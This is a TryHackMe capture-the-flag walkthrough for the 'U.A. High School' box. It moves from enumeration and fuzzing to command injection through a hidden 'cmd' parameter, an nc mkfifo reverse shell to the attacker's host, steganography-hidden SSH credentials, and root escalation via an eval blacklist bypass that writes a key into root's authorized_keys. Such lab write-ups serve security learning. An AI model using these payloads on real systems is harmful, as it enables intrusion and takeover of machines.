# U.A. High School — TryHackMe

An easy Linux web box themed around *My Hero Academia*.

## Recon

I started with an `nmap` scan:

```bash  
nmap -sC -sV <IP>
```

Two ports open:

| Port | Service | Version |  
|------|---------|------------------------|  
| 22 | SSH | OpenSSH 8.2p1 (Ubuntu) |  
| 80 | HTTP | Apache 2.4.41 (Ubuntu) |

SSH isn't an entry point on its own, so everything points at the web server on port 80.

## Enumeration

The site is a static school page (About, Courses, Admissions, Contact). The contact form has `action="#"`, so it goes nowhere — all the pages are plain HTML with no working forms. A dead end on their own.

I ran a directory scan:

``` bash  
gobuster dir -u http://&lt;IP&gt;/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -x js,html,php,txt  
```

`/assets` showed up as a directory (301). Scanning inside it:

```bash  
gobuster dir -u http://&lt;IP&gt;/assets/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -x js,html,php,txt  
```

```  
/images (Status: 301)  
/index.php (Status: 200) \[Size: 0\]  
```

An `index.php` inside `/assets/` is odd — that folder usually holds CSS and images, not PHP logic. Worth a look.

## Finding the hidden parameter

Curling it shows an empty body but a PHP session cookie:

```bash  
curl -i http://&lt;IP&gt;/assets/index.php  
```

```  
HTTP/1.1 200 OK  
Set-Cookie: PHPSESSID=...  
Content-Length: 0  
```

So the script does something, it just needs the right input. My first attempts failed because I was fuzzing with a dummy value and a parameter-name wordlist. The script only reacts when the parameter's **value** is an actual command, and the parameter name lives in a plain words list. Fixing both:

```bash  
ffuf -u 'http://&lt;IP&gt;/assets/index.php?FUZZ=id' \\  
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt \\  
  -mc all -fs 0  
```

One hit stood out from all the empty responses:

```  
cmd \[Status: 200, Size: 72\]  
```

## Command injection

The parameter is `cmd`. The response comes back base64-encoded, so I decode it:

```bash  
curl -s -G "http://&lt;IP&gt;/assets/index.php" --data-urlencode "cmd=id" | base64 -d  
```

```  
uid=33(www-data) gid=33(www-data) groups=33(www-data)  
```

Remote command execution as \`www-data\`. That's the foothold.

## Reverse shell

I set up a listener:

```bash  
nc -lvnp 9999  
```

A `bash -i` payload didn't come back (the target's default shell wasn't cooperating), so I used the `nc mkfifo` payload instead. `curl --data-urlencode` handles the special characters so I don't have to URL-encode by hand:

```bash  
curl -s -G "http://&lt;IP&gt;/assets/index.php" \\  
  --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc &lt;MY_IP&gt; 9999 >/tmp/f"  
```

The listener caught the shell as \`www-data\`. I stabilized it:

```bash  
python3 -c 'import pty; pty.spawn("/bin/bash")'  
export TERM=xterm  
\# Ctrl+Z, then on my box:  
stty raw -echo; fg  
```

## Getting to deku

Exploring the box, I found the target user is `deku`, whose home holds `user.txt` (readable only by deku). I also spotted a hidden image on the box named `oneforall` — a clear *My Hero Academia* nod (One For All is the power All Might passes to Deku).

I pulled the image back to my machine and looked at it. `exiftool` was suspicious: the extension said `.jpg` but the file claimed to be a PNG, with `PNG image did not start with IHDR`. Checking the raw bytes with `xxd`, the file had a fake PNG header slapped in front of real JPEG data (`FF DB`, `FF C0` markers). The magic bytes had been tampered with to break the file.

&nbsp;

Once the header was repaired into a valid JPEG, the image opened. But nothing useful was visible on it — the payload was hidden inside the file. \`steghide\` reported an embedded-data capacity, so there was something in there behind a passphrase.

`stegseek` against rockyou failed, which meant the passphrase wasn't a common word.

it was stored on the target itself, in a readable file accessible from the www-data shell. Once I found it, steghide extract handed over deku's SSH credentials.

```bash  
ssh deku@&lt;IP&gt;  
cat user.txt  
```

## Privilege escalation

First thing as `deku`:

```bash  
sudo -l  
```

```  
User deku may run the following commands:  
    (ALL) /opt/NewComponent/feedback.sh  
```

So deku can run this script as anyone, including root. Reading it:

```bash  
cat /opt/NewComponent/feedback.sh  
```

The important part:

```bash  
read feedback  
if \[\[ "\$feedback" != \*"\\\`"\* && "\$feedback" != \*")"\* && "\$feedback" != \*"\\\$("\* && "\$feedback" != \*"|"\* && "\$feedback" != \*"&"\* && "\$feedback" != \*";"\* && "\$feedback" != \*"?"\* && "\$feedback" != \*"!"\* && "\$feedback" != \*"\\\\"\* \]\]; then  
    eval "echo \$feedback"  
    ...  
```

The vulnerability is `eval` on user input, running as root via sudo. There's a blacklist blocking the usual command-chaining and substitution characters .

The critical observation: the blacklist **doesn't block redirection** (`>` / `>>`). So instead of chaining a command, I can use `eval "echo ..."` to **write to a file** as root. And a root-controlled file write is a classic privilege-escalation primitive.

The cleanest target is SSH: if my public key ends up in root's `authorized_keys`, I can log in as root with my private key — no password needed.

I generated a keypair on my machine:

```bash  
mkdir -p ~/highschool  
ssh-keygen -t ed25519 -f ~/highschool/root_key  
cat ~/highschool/root_key.pub  
```

Then I ran the sudo script and fed it an input that, once wrapped in \`eval "echo ..."\`, appends my public key into \`/root/.ssh/authorized_keys\` — using only redirection, no blacklisted characters:

```bash  
sudo /opt/NewComponent/feedback.sh  
\# feedback input: my public key redirected (>>) into /root/.ssh/authorized_keys  
```

With the key in place, I logged in as root:

```bash  
ssh -i ~/highschool/root_key root@&lt;IP&gt;  
cat /root/root.txt  
```



*Note: IPs redacted. No live flags reproduced in full — solve it yourself!*
